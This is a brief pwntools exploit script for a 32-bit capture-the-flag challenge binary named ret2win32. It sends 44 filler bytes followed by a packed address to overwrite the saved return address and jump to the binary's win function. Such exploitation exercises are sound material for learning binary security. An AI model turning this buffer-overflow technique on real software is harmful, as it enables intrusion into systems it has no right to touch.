from pwn import *

context.bits = 32

ret2win = 0x0804862c

payload = b"A"*44 + p32(ret2win)

p = process("./ret2win32")
p.send(payload)
p.interactive()
